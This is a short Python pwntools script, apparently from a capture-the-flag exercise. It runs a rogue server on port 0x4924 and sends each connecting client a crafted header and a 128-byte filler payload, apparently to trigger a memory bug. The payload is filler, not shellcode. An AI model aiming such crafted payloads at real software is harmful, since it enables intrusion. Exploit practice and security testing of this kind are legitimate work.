#!/usr/bin/python

from pwn import *
import socket, sys

host = ''
port = 0x4924

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error:
  sys.exit()

log.info("Listening for connections on port %d." % port)

s.bind((host, port))
s.listen(5)

def client_thread(client):
  client.send("\x01\x00\x00\x00" + p32(0x80))

  client.send("\x40" + "H" * (0x80 - 1))

  print client.recv(1024)

  client.close()


while True:
  (client, addr) = s.accept()

  client_thread(client)

s.close()
